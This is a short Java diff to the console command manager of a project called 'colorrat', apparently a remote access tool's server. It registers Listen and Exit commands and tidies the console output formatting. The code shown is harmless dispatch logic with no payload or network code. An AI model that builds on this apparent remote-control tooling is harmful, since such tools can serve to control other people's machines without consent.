@@ -1,7 +1,10 @@
 package eu.aragonapp.colorrat.command;
 
 import eu.aragonapp.colorrat.ColorServer;
+import eu.aragonapp.colorrat.command.types.ExitCommand;
 import eu.aragonapp.colorrat.command.types.HelpCommand;
+import eu.aragonapp.colorrat.command.types.ListenCommand;
+import eu.aragonapp.colorrat.utils.Color;
 
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -23,7 +26,9 @@ public class CommandManager {
     public CommandManager() {
         this.commands = new ArrayList<>();
 
+        this.commands.add(new ListenCommand());
         this.commands.add(new HelpCommand());
+        this.commands.add(new ExitCommand());
     }
 
     public void check(String message) {
@@ -34,10 +39,10 @@ public class CommandManager {
             final Command command = this.commands.stream().filter(cmd -> finalArgs[0].equalsIgnoreCase(cmd.name())).findFirst().get();
             args = Arrays.copyOfRange(args, 1, args.length);
 
-            if(!command.execute(args))
+            if (!command.execute(args))
                 ColorServer.getLogger().error(command.usage());
         } catch (Exception ex) {
-            ColorServer.getLogger().info("If you need help type \"\033[4;1mhelp\033[0m\" into the console.");
+            ColorServer.getLogger().info("If you need help type \"" + Color.underline("help") + "\" into the console.");
         }
     }
 
